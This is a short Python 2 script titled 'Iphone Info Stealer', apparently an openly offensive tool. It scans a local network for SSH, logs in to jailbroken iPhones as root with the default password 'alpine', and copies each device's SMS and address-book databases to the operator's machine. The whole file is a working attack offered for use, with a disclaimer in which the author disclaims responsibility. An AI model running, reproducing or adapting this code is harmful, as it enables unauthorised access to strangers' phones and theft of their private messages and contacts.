#!/usr/bin/env python

#########################################
# Program : Iphone Info Stealer
# author : cloud
# contact : cloud[at]madpowah.org
# website : http://blog.madpowah.org
#
# You need to be connect to an Access Point.
# Launch iphonestealer.py and it will steal 
# SMS and Contact list of all iphones 
# jailbreaked with SSH on the network.
#
# This program uses the lib paramiko.
#
# I'm not responsible of the use of this
# program.
##########################################


import socket
import sys
import os 
import paramiko	

# Modify this values
local_file='/home/user/where/you/want/to/store/data/' # where you will store data
network = "192.168.0." # the network you want to scan
# End of modif

port = 'ssh'
username = 'root'
password = 'alpine'
sms_remote = '/private/var/mobile/Library/SMS/sms.db'
contact_remote = '/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb'
ip_num = 1
ip_list = []


print ">> Iphone Info Stealer by cloud <cloud@madpowah.org>"
print "--------------------"
sys.stdout.write(">> Scanning Network ")
sys.stdout.write(network)
sys.stdout.write("0/24")

while ip_num < 255:
	
	host = network + str(ip_num)
	sys.stdout.write('.')
	sys.stdout.flush()
	
	try:
		sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock1.settimeout(0.2)
		sock1.connect((host,22))
		ip_list.append(host)
		sock1.close()
	except:
		sys.stdout.write('.')
		sys.stdout.flush()

	ip_num += 1

print "\n\n>> Getting SMS and Contact List"

for hostname in ip_list:
	try:
		print 'Testing with :', hostname, '...',
		t = paramiko.SSHClient()
		t.set_missing_host_key_policy(paramiko.AutoAddPolicy())
		t.load_system_host_keys()
		t.connect(hostname, port=port, username=username, password=password)
		ftp = t.open_sftp()
		try:
			local_file_ok = local_file + hostname + '-sms.db'
			ftp.get(sms_remote, local_file_ok)
			print "SMS STOLEN ! ...",
		except:
			print "No SMS :( ...",
		try:
			local_file_ok = local_file + hostname + '-contact.db'
			ftp.get(contact_remote, local_file_ok)
			print "Contact STOLEN !"
		except:
			print "No Contact List :( ..."
			
		ftp.close()
		t.close()
	except :
		print "Not an iphone"

